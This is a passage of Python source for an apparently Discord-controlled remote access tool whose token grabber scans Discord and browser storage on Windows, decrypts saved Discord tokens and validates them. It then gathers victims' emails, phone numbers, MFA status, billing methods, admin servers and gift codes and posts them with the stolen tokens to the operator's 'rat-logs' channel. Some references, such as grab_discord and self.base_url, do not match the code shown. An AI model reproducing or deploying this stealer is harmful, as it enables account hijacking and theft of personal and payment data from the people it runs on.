        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens, self.uids = [], []
        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path): continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'): continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                    
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})
        if r.status_code == 200: return True
        return False
    
    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path): return
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return
        with open(path, "r", encoding="utf-8") as f: c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

class fetch_tokens:
    def __init__(self):
        self.tokens = extract_tokens().tokens
    
    def upload(self):
        if not self.tokens:
            return
        final_to_return = []
        for token in self.tokens:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
            
            if user['premium_type'] == 0:
                nitro = 'None'
            elif user['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro = 'Nitro'
            elif user['premium_type'] == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'None'

            if billing:
                payment_methods = []
                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('Credit Card')
                    elif method['type'] == 2:
                        payment_methods.append('PayPal')
                    else:
                        payment_methods.append('Unknown')
                payment_methods = ', '.join(payment_methods)
            else: payment_methods = None

            if guilds:
                hq_guilds = []
                for guild in guilds:
                    admin = True if guild['permissions'] == '4398046511103' else False
                    if admin and guild['approximate_member_count'] >= 100:
                        owner = '✅' if guild['owner'] else '❌'
                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0: invite = 'https://discord.gg/' + invites[0]['code']
                        else: invite = "https://youtu.be/dQw4w9WgXcQ"
                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
                        if len('\n'.join(hq_guilds)) + len(data) >= 1024: break
                        hq_guilds.append(data)

                if len(hq_guilds) > 0: hq_guilds = '\n'.join(hq_guilds)
                else: hq_guilds = None
            else: hq_guilds = None
            
            if gift_codes:
                codes = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code = code['code']
                    data = f":gift: `{name}`\n:ticket: `{code}`"
                    if len('\n\n'.join(codes)) + len(data) >= 1024: break
                    codes.append(data)
                if len(codes) > 0: codes = '\n\n'.join(codes)
                else: codes = None
            else: codes = None

            embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
            embed.set_thumbnail(url=avatar)

            embed.add_field(name="\u200b\n📜 Token:", value=f"```{token}```\n\u200b", inline=False)
            embed.add_field(name="💎 Nitro:", value=f"{nitro}", inline=False)
            embed.add_field(name="💳 Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=False)
            embed.add_field(name="🔒 MFA:", value=f"{mfa}\n\u200b", inline=False)
            
            embed.add_field(name="📧 Email:", value=f"{email if email != None else 'None'}", inline=False)
            embed.add_field(name="📳 Phone:", value=f"{phone if phone != None else 'None'}\n\u200b", inline=False)    


            if hq_guilds != None:
                embed.add_field(name="🏰 HQ Guilds:", value=hq_guilds, inline=False)

            if codes != None:
                embed.add_field(name="\u200b\n🎁 Gift Codes:", value=codes, inline=False)

            final_to_return.append(embed)
        return final_to_return


@bot.command()
async def grab_distoken(ctx):
    try:
        await ctx.send('Fetching Discord user info...')
        discord_info = grab_discord().initialize()
        for embed in discord_info:
            await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f'Error occurred: {e}')

# Function : ERROR HANDLER 
@bot.event
async def on_error(event, *args, **kwargs):
    channel = discord.utils.get(bot.get_all_channels(), name='・🔔│ʀᴀᴛ-ʟᴏɢꜱ')

    # Get the exception information
    exception_type, exception, traceback = sys.exc_info()

    # Log the error message
    error_message = f"An error occurred in event {event}: {exception}"
    await channel.send(f"``{error_message}``")

    # Print the error to the console
    traceback.print_exception(exception_type, exception, traceback)


@bot.event
async def on_command_error(ctx, error):
    channel = discord.utils.get(bot.get_all_channels(), name='・🔔│ʀᴀᴛ-ʟᴏɢꜱ')

    # Log the command error
    if isinstance(error, commands.CommandNotFound):
        error_message = f"Command `{ctx.message.content}` is not found"
    else:
        error_message = f"An error occurred in command '{ctx.message.content}': {error}"

    await channel.send(f"``{error_message}``")
        
bot.run('YOUR_DISCORD_TOKEN') # Replace With Your Token
